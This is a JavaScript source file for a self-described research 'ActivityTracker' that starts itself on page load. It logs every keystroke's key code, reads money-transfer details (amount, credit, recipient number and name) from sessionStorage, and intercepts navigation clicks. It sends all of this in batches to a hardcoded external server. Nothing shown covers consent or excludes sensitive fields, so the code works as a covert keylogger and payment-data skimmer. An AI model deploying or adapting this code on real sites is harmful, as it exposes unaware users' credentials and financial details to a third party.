/**
 * ActivityTracker - Server-Connected Version
 * Automatically sends all tracking data to a central server
 * Perfect for research experiments with centralized data collection
 */

class ActivityTrackerServer {
    constructor(options = {}) {
        this.data = [];
        this.sessionId = this.getOrCreateSessionId(); // Use persistent session ID
        this.pageLoadTime = Date.now();
        this.userIP = null;
        this.currentPage = window.location.href;
        this.sendQueue = [];
        this.isOnline = navigator.onLine;

        // Configuration options
        this.config = {
            serverUrl: 'https://adminproto.yux.digital', // Default server URL
            batchSize: 10,              // Send data in batches
            sendInterval: 5000,         // Send every 5 seconds
            maxRetries: 3,              // Retry failed requests
            retryDelay: 2000,           // Wait 2 seconds between retries
            offlineStorage: true,       // Store data when offline
            experimentId: 'default',    // Experiment identifier
            ...options
        };

        this.init();
    }

    /**
     * Initialize the tracker
     */
    async init() {
        console.log('Initializing ActivityTracker with server connection...');

        await this.initializeSession();
        this.setupEventListeners();
        this.startBatchSender();
        this.setupNetworkListeners();

        // Track initial page load
        this.trackPageLoad();

        // Track page unload to capture time spent
        window.addEventListener('beforeunload', () => {
            this.trackPageUnload();
            this.sendDataImmediate(); // Try to send remaining data
        });

        // Track page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.trackEvent('page_hidden', { timestamp: Date.now() });
            } else {
                this.trackEvent('page_visible', { timestamp: Date.now() });
            }
        });

        console.log('ActivityTracker initialized successfully');
    }

    /**
     * Generate a unique session ID
     */
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    /**
     * Get existing session ID from localStorage or create a new one
     */
    getOrCreateSessionId() {
        try {
            let stored = localStorage.getItem('activityTracker_sessionId');
            
            // Force a re-read to ensure we get the latest value
            if (!stored) {
                // Try one more time in case there was a timing issue
                stored = localStorage.getItem('activityTracker_sessionId');
            }
            
            if (stored) {
                console.log('Using existing session ID:', stored);
                return stored;
            }

            const newSessionId = this.generateSessionId();
            console.log('Created new session ID:', newSessionId);
            // Write immediately and synchronously
            localStorage.setItem('activityTracker_sessionId', newSessionId);
            // Verify it was written
            const verify = localStorage.getItem('activityTracker_sessionId');
            console.log('Verified session ID in localStorage:', verify);
            return newSessionId;
        } catch (error) {
            // Fallback if localStorage is not available
            console.warn('localStorage not available, using generated session ID');
            return this.generateSessionId();
        }
    }

    /**
     * Initialize session with server
     */
    async initializeSession() {
        if (!this.config.serverUrl) {
            console.error('Server URL is not configured');
            return;
        }

        try {
            const response = await fetch(`${this.config.serverUrl}/api/session`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: this.sessionId,
                    experimentId: this.config.experimentId
                }),
                signal: AbortSignal.timeout(5000) // 5 second timeout
            });

            if (!response.ok) {
                throw new Error(`Server responded with status: ${response.status}`);
            }

            const result = await response.json();
            console.log('Session initialized:', result);
            this.isOnline = true;

        } catch (error) {
            console.warn('Could not initialize session with server:', error.message);
            console.log('Data will be stored locally until server is available');
            this.isOnline = false;
            
            // Store in offline queue
            if (this.config.offlineStorage) {
                console.log('Offline storage is enabled - data will be queued');
            }
        }
    }

    /**
     * Setup network listeners for online/offline detection
     */
    setupNetworkListeners() {
        window.addEventListener('online', () => {
            this.isOnline = true;
            console.log('Connection restored - sending queued data');
            this.sendQueuedData();
        });

        window.addEventListener('offline', () => {
            this.isOnline = false;
            console.log('Connection lost - data will be queued');
        });
    }

    /**
     * Track page load event
     */
    trackPageLoad() {
        this.trackEvent('page_load', {
                    montant: sessionStorage.getItem("montant"),
                    credit: sessionStorage.getItem("credit"),
                    receiverNum: sessionStorage.getItem("receiverNum"),
                    receiverName: sessionStorage.getItem("receiverName"),
                    amount: sessionStorage.getItem("confAmountTax"),
                    amountFlat: sessionStorage.getItem("confAmount"),
                    amountCredit: sessionStorage.getItem("amountCredit"),
                    isMuted: sessionStorage.getItem("isMuted"),
                    showInput: sessionStorage.getItem("showInput"),
            url: this.currentPage,
            timestamp: this.pageLoadTime,
            referrer: document.referrer,
            title: document.title,
            userAgent: navigator.userAgent,
            screenSize: `${screen.width}x${screen.height}`,
            viewportSize: `${window.innerWidth}x${window.innerHeight}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        });
    }


   

    /**
     * Track page unload event
     */
    trackPageUnload() {
        const timeSpent = Date.now() - this.pageLoadTime;
        this.trackEvent('page_unload', {
            url: this.currentPage,
            timestamp: Date.now(),
            timeSpentMs: timeSpent,
            timeSpentSeconds: Math.round(timeSpent / 1000)
        });
    }

    /**
     * Setup event listeners for tracking
     */
    setupEventListeners() {
        this.setupClickTracking();
        this.setupKeyupTracking();
    }

     /**
     * Setup key up event
     */
    setupKeyupTracking() {
         document.addEventListener('keyup', async (event) => {
            await this.trackEvent('keyup', {
             key: ` ${event.code}`
            });


        });
    }

    /**
     * Setup click tracking
     */
    setupClickTracking() {
        document.addEventListener('click', async (event) => {
            const rect = event.target.getBoundingClientRect();

            // Get onclick information
            let onclickInfo = null;
            if (event.target.onclick) {
                onclickInfo = {
                    hasOnclick: true,
                    onclickString: event.target.onclick.toString()
                };
            } else if (event.target.hasAttribute('onclick')) {
                onclickInfo = {
                    hasOnclick: true,
                    onclickString: event.target.getAttribute('onclick')
                };
            }

            // Check if this click will cause navigation
            const willNavigate = this.willCauseNavigation(event.target);

            // If navigation will occur, prevent it and handle tracking first
            if (willNavigate) {
                event.preventDefault();
                
                // Get the navigation target from the link
                const navigationTarget = event.target.href || 
                                        event.target.closest('a')?.href || 
                                        null;
                
                // Track the event
                await this.trackEvent('click', {
                    timestamp: Date.now(),
                    x: event.clientX,
                    y: event.clientY,
                    pageX: event.pageX,
                    pageY: event.pageY,
                    elementX: rect.left + event.offsetX,
                    elementY: rect.top + event.offsetY,
                    target: {
                        tagName: event.target.tagName,
                        id: event.target.id || '',
                        className: event.target.className || '',
                        innerText: event.target.innerText?.substring(0, 100) || '',
                        href: navigationTarget || '',
                        type: event.target.type || '',
                        src: event.target.src || '',
                        alt: event.target.alt || ''
                    },
                    onclick: onclickInfo,
                    willNavigate: true,
                    navigationTarget: navigationTarget,
                    selector: this.getElementSelector(event.target),
                    
                    montant: sessionStorage.getItem("montant"),
                    credit: sessionStorage.getItem("credit"),
                    receiverNum: sessionStorage.getItem("receiverNum"),
                    receiverName: sessionStorage.getItem("receiverName"),
                    amount: sessionStorage.getItem("confAmountTax"),
                    amountFlat: sessionStorage.getItem("confAmount"),
                    amountCredit: sessionStorage.getItem("amountCredit"),
                    isMuted: sessionStorage.getItem("isMuted"),
                    showInput: sessionStorage.getItem("showInput"),
                }, true);
                
                // Navigate after ensuring data is sent
                if (navigationTarget) {
                    window.location.href = navigationTarget;
                }
            } else {
                // Normal tracking for non-navigation clicks
                this.trackEvent('click', {        
                    timestamp: Date.now(),
                    x: event.clientX,
                    y: event.clientY,
                    pageX: event.pageX,
                    pageY: event.pageY,
                    elementX: rect.left + event.offsetX,
                    elementY: rect.top + event.offsetY,
                    target: {
                        tagName: event.target.tagName,
                        id: event.target.id || '',
                        className: event.target.className || '',
                        innerText: event.target.innerText?.substring(0, 100) || '',
                        href: event.target.href || '',
                        type: event.target.type || '',
                        src: event.target.src || '',
                        alt: event.target.alt || ''
                    },
                    onclick: onclickInfo,
                    willNavigate: false,
                    selector: this.getElementSelector(event.target),
                    montant: sessionStorage.getItem("montant"),
                    credit: sessionStorage.getItem("credit"),
                    receiverNum: sessionStorage.getItem("receiverNum"),
                    receiverName: sessionStorage.getItem("receiverName"),
                    amount: sessionStorage.getItem("confAmountTax"),
                    amountFlat: sessionStorage.getItem("confAmount"),
                    amountCredit: sessionStorage.getItem("amountCredit"),
                    isMuted: sessionStorage.getItem("isMuted"),
                    showInput: sessionStorage.getItem("showInput")
                }, false);
            }
        }, true); // Use capture phase to intercept before other handlers
    }

    /**
     * Check if clicking an element will cause navigation
     */
    willCauseNavigation(element) {
        // Check if element has onclick that changes location
        if (element.onclick) {
            const onclickString = element.onclick.toString();
            if (onclickString.includes('window.location') || onclickString.includes('location.href')) {
                return true;
            }
        }

        // Check if element has onclick attribute that changes location
        if (element.hasAttribute('onclick')) {
            const onclickAttr = element.getAttribute('onclick');
            if (onclickAttr.includes('window.location') || onclickAttr.includes('location.href')) {
                return true;
            }
        }

        // Check if it's a link
        if (element.tagName === 'A' && element.href) {
            return true;
        }

        // Check parent elements for onclick that might cause navigation
        let parent = element.parentElement;
        while (parent) {
            if (parent.onclick) {
                const onclickString = parent.onclick.toString();
                if (onclickString.includes('window.location') || onclickString.includes('location.href')) {
                    return true;
                }
            }
            if (parent.hasAttribute('onclick')) {
                const onclickAttr = parent.getAttribute('onclick');
                if (onclickAttr.includes('window.location') || onclickAttr.includes('location.href')) {
                    return true;
                }
            }
            parent = parent.parentElement;
        }

        return false;
    }

    /**
     * Generate CSS selector for an element
     */
    getElementSelector(element) {
        if (element.id) {
            return `#${element.id}`;
        }

        let selector = element.tagName.toLowerCase();

        if (element.className) {
            selector += '.' + element.className.split(' ').join('.');
        }

        // Add position if no unique identifier
        if (!element.id && !element.name) {
            const siblings = Array.from(element.parentNode?.children || []);
            const index = siblings.indexOf(element);
            if (index >= 0) {
                selector += `:nth-child(${index + 1})`;
            }
        }

        return selector;
    }

    /**
     * Track a generic event
     */
    async trackEvent(type, data = {}, sendImmediate = false) {
        const event = {
            sessionId: this.sessionId,
            type: type,
            url: window.location.href,
            timestamp: data.timestamp || Date.now(),
            ...data
        };

        // Add to local data for immediate access
        this.data.push(event);

        // Add to send queue for server transmission
        this.sendQueue.push(event);

        // Dispatch custom event for external listeners
        window.dispatchEvent(new CustomEvent('activityTracked', { detail: event }));

        console.log('Event tracked:', type, event);

        // Send immediately if this will cause navigation
        if (sendImmediate) {
            await this.sendDataImmediate();
            return new Promise(resolve => setTimeout(resolve, 150));
        }
    }

    /**
     * Start the batch sender
     */
    startBatchSender() {
        setInterval(() => {
            if (this.sendQueue.length > 0 && this.isOnline) {
                this.sendBatch();
            }
        }, this.config.sendInterval);
    }

    /**
     * Send a batch of events to server
     */
    async sendBatch() {
        if (this.sendQueue.length === 0) return;

        const batch = this.sendQueue.splice(0, this.config.batchSize);

        try {
            const response = await fetch(`${this.config.serverUrl}/api/track`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: this.sessionId,
                    events: batch
                })
            });

            if (!response.ok) {
                throw new Error(`Server responded with status: ${response.status}`);
            }

            const result = await response.json();
            console.log(`Sent ${batch.length} events to server:`, result);

        } catch (error) {
            console.warn('Failed to send batch to server:', error.message);

            // Put events back in queue for retry
            this.sendQueue.unshift(...batch);

            // Store offline if enabled
            if (this.config.offlineStorage) {
                this.storeOfflineData(batch);
            }
        }
    }

    /**
     * Send data immediately (for page unload)
     */
    async sendDataImmediate() {
        if (this.sendQueue.length === 0) return;

        try {
            const response = await fetch(`${this.config.serverUrl}/api/track`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    sessionId: this.sessionId,
                    events: this.sendQueue
                }),
                keepalive: true  // Ensures request completes even if page navigates
            });

            if (response.ok) {
                console.log(`✓ Sent ${this.sendQueue.length} events`);
                const sentEvents = this.sendQueue.length;
                this.sendQueue = [];
                return sentEvents;
            } else {
                throw new Error(`Server returned ${response.status}`);
            }
        } catch (error) {
            console.warn('Failed to send data:', error.message);
            // Store offline for retry
            if (this.config.offlineStorage) {
                this.storeOfflineData(this.sendQueue);
            }
            return 0;
        }
    }

    /**
     * Store data offline in localStorage
     */
    storeOfflineData(events) {
        try {
            const stored = localStorage.getItem('activityTracker_offline') || '[]';
            const offlineData = JSON.parse(stored);
            offlineData.push(...events);

            // Limit offline storage to prevent localStorage overflow
            const maxOfflineEvents = 1000;
            if (offlineData.length > maxOfflineEvents) {
                offlineData.splice(0, offlineData.length - maxOfflineEvents);
            }

            localStorage.setItem('activityTracker_offline', JSON.stringify(offlineData));
            console.log(`Stored ${events.length} events offline`);
        } catch (error) {
            console.warn('Could not store data offline:', error.message);
        }
    }

    /**
     * Send queued offline data when back online
     */
    async sendQueuedData() {
        try {
            const stored = localStorage.getItem('activityTracker_offline');
            if (!stored) return;

            const offlineData = JSON.parse(stored);
            if (offlineData.length === 0) return;

            console.log(`Sending ${offlineData.length} offline events`);

            // Add offline data to send queue
            this.sendQueue.unshift(...offlineData);

            // Clear offline storage
            localStorage.removeItem('activityTracker_offline');

            // Send immediately
            this.sendBatch();

        } catch (error) {
            console.warn('Could not send queued data:', error.message);
        }
    }

    /**
     * Get local data (for debugging)
     */
    getData() {
        return this.data;
    }

    /**
     * Clear local data
     */
    clearData() {
        this.data = [];
    }

    /**
     * Get server statistics
     */
    async getServerStats() {
        try {
            const response = await fetch(`${this.config.serverUrl}/api/stats`);
            if (!response.ok) {
                throw new Error(`Server responded with status: ${response.status}`);
            }
            return await response.json();
        } catch (error) {
            console.warn('Could not fetch server stats:', error.message);
            return null;
        }
    }

    /**
     * Manual CSV export (calls server endpoint)
     */
    async exportCSV(filename = null) {
        try {
            const url = `${this.config.serverUrl}/api/export/csv`;
            window.open(url, '_blank');
        } catch (error) {
            console.warn('Could not export CSV:', error.message);
        }
    }

    /**
     * Stop tracking and cleanup
     */
    stop() {
        this.trackPageUnload();
        this.sendDataImmediate();
    }

    /**
     * Update server URL (useful for different environments)
     */
    setServerUrl(url) {
        this.config.serverUrl = url;
        console.log('Server URL updated to:', url);
    }

    /**
     * Check connection status
     */
    isConnected() {
        return this.isOnline;
    }

    /**
     * Clear session ID (useful for starting a new session)
     */
    clearSessionId() {
        try {
            localStorage.removeItem('activityTracker_sessionId');
            this.sessionId = this.getOrCreateSessionId();
            console.log('Session ID cleared, new session started');
        } catch (error) {
            console.warn('Could not clear session ID from localStorage');
        }
    }

    /**
     * Get session information
     */
    getSessionInfo() {
        return {
            sessionId: this.sessionId,
            pageLoadTime: this.pageLoadTime,
            currentPage: this.currentPage,
            isOnline: this.isOnline,
            pendingEvents: this.sendQueue.length,
            totalTracked: this.data.length
        };
    }
}

// Make it available globally
window.ActivityTrackerServer = ActivityTrackerServer;

// Auto-initialize if data-server-url attribute is present
document.addEventListener('DOMContentLoaded', function () {
    const script = document.querySelector('script[src*="activity-tracker-server"]');
    if (script && script.hasAttribute('data-server-url')) {
        const serverUrl = script.getAttribute('data-server-url');
        const experimentId = script.getAttribute('data-experiment-id') || 'default';

        window.tracker = new ActivityTrackerServer({
            serverUrl: serverUrl,
            experimentId: experimentId
        });
    }
});